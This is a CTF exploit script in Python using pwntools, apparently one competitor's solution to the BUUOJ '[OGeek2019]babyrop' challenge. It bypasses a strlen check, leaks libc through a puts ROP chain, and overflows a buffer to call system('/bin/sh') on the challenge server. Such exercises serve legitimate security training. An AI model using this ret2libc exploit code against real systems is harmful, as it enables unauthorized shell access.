'''
@Author       : 白银
@Date         : 2023-04-02 14:17:39
@LastEditors  : 白银
@LastEditTime : 2023-04-02 16:42:07
@FilePath     : /pwn/[OGeek2019]babyrop.py
@Description  : ret2libc  https://buuoj.cn/challenges#[OGeek2019]babyrop
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './[OGeek2019]babyrop'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 28357)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

payload = flat(['\x00', '\x80' * 7])  # 先截断strlen(),然后要让buf[7] > 127
io.sendline(payload)
io.recvuntil("Correct\n")

puts_plt = elf.plt['puts']
print("puts_plt------", hex(puts_plt))
puts_got = elf.got['puts']
print("puts_got------", hex(puts_got))
main_addr = 0x8048825
print("main_addr------", hex(main_addr))

padding = 0xe7 + 4  # ida看，buf和r差多少，单纯的e7覆盖距离不够
return_addr = 0x80489a0  # 程序里面有get_flag的函数，直接找地址
exit_addr = 0x804e6a0
payload2 = flat(['a' * padding, puts_plt, main_addr, puts_got]) # 泄露libc
io.sendline(payload2)

puts_addr = u32(io.recvline()[:-1].ljust(4, b'\x00'))
# libc = finder('puts', puts_addr)
libc_base = puts_addr - libc.symbols['puts']
print("libc_base------", hex(libc_base))
system_addr = libc_base + libc.symbols['system']
print("system_addr------", hex(system_addr))
bin_sh_addr = libc_base + libc.search(b'/bin/sh').__next__()
print("bin_sh_addr------", hex(bin_sh_addr))

io.sendline(payload)
# io.recvuntil("Correct\n")

payload3 = flat(['a' * padding, system_addr, main_addr, bin_sh_addr]) # attack
io.sendline(payload3)

io.interactive()
